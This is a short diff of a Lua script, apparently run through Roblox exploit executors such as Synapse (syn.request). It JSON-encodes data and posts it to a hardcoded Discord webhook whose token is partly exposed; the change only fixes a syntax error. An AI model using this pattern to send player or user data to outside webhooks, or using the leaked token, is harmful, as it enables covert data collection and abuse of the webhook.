@@ -18,7 +18,7 @@ local url = "https://discord.com/api/webhooks/950058415923818577/C0_-USWgvq6RSso
                 }
                 local newdata = game:GetService("HttpService"):JSONEncode(data)
 
-                local headers = {``
+                local headers = {
                     ["content-type"] = "application/json"
                 }
                 request = http_request or request or HttpPost or syn.request
